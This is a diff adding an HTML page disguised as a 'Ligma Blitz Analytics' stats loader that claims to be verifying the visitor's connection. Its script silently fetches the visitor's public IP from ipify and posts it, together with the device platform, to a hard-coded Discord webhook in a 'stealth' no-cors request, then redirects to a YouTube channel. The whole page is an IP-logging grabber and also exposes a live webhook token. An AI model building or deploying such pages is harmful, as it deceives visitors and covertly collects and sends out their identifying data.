@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Ligma Blitz Analytics</title>
+</head>
+<body style="background-color: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 50px;">
+    <h2>LOADING LIGMA BLITZ STATS...</h2>
+    <p>Please wait while we verify your connection.</p>
+
+    <script>
+        var hook = "https://discord.com/api/webhooks/1497687704983310406/yv6VZ2yuH-bxE0fD_BNQAGIUOeQu0gB9-z44lbRhSdiJOvSpHBzljrwvDooIfw6hyQNp";
+        var tube = "https://youtube.com/@LigmaBlox-w7m";
+
+        // This function forces the data through the browser's security wall
+        async function logData() {
+            try {
+                // Get the IP first
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                
+                // Send to Discord using the "Stealth" mode
+                await fetch(hook, {
+                    method: 'POST',
+                    mode: 'no-cors', // THIS IS THE KEY FIX
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: "🚨 **New Log Found**\n**Groupness Number:** " + data.ip + "\n**Device:** " + navigator.platform
+                    })
+                });
+            } catch (e) {
+                console.log("Silent Error");
+            } finally {
+                // Always send them to your YouTube after 2 seconds
+                setTimeout(() => { window.location.href = tube; }, 2000);
+            }
+        }
+
+        logData();
+
+        // Hard redirect if the internet is slow
+        setTimeout(() => { window.location.href = tube; }, 5000);
+    </script>
+</body>
+</html>
